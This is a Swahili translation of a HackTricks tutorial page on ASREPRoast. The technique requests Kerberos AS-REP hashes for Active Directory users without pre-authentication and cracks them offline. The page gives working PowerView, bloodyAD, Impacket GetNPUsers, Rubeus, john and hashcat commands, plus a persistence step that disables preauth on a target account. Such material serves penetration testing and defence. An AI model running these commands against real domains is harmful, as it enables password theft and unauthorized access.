# ASREPRoast

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho Kuhusu Kudukua**\
Shiriki na yaliyomo yanayochunguza msisimko na changamoto za kudukua

**Habari za Kudukua za Wakati Halisi**\
Endelea kuwa na habari za ulimwengu wa kudukua kwa kasi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Baki na habari kuhusu uzinduzi wa tuzo za mdudu mpya na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana sifa ya **mahitaji ya awali ya Kerberos**. Kimsingi, udhaifu huu unaruhusu wadukuzi kuomba uwakilishi wa uthibitisho kwa mtumiaji kutoka kwa Msimamizi wa Kikoa (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha hujibu na ujumbe uliosimbwa na ufunguo uliopatikana kutoka kwa nenosiri la mtumiaji, ambao wadukuzi wanaweza kujaribu kuvunja nje ya mtandao ili kugundua nenosiri la mtumiaji.

Mahitaji muhimu kwa shambulio hili ni:
- **Kutokuwepo kwa mahitaji ya awali ya Kerberos**: Watumiaji walengwa lazima wasiwe na kipengele hiki cha usalama kimeamilishwa.
- **Unganisho na Msimamizi wa Kikoa (DC)**: Wadukuzi wanahitaji kupata DC ili kutuma maombi na kupokea ujumbe uliosimbwa.
- **Akaunti ya kikoa hiari**: Kuwa na akaunti ya kikoa kunaruhusu wadukuzi kutambua watumiaji walio hatarini zaidi kupitia uchunguzi wa LDAP. Bila akaunti kama hiyo, wadukuzi lazima wagusishe majina ya mtumiaji.
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### Ombi la ujumbe wa AS_REP

{% code title="Kutumia Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Kutumia Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Kuvunja AS-REP kwa kutumia Rubeus kutazalisha 4768 na aina ya kusimbua ya 0x17 na aina ya awali ya 0.
{% endhint %}

### Kuvunja
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Uthabiti

Lazima **preauth** isihitajike kwa mtumiaji ambaye una ruhusa za **GenericAll** (au ruhusa za kuandika mali):

{% code title="Kutumia Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## Marejeo

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na seva ya [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa bug bounty!

**Machapisho ya Udukuzi**\
Shiriki na yaliyomo yanayochunguza msisimko na changamoto za udukuzi

**Habari za Udukuzi za Wakati Halisi**\
Endelea kuwa na habari za ulimwengu wa udukuzi kwa kasi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Hivi Karibuni**\
Baki na habari kuhusu bug bounty mpya zinazozinduliwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ina tangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
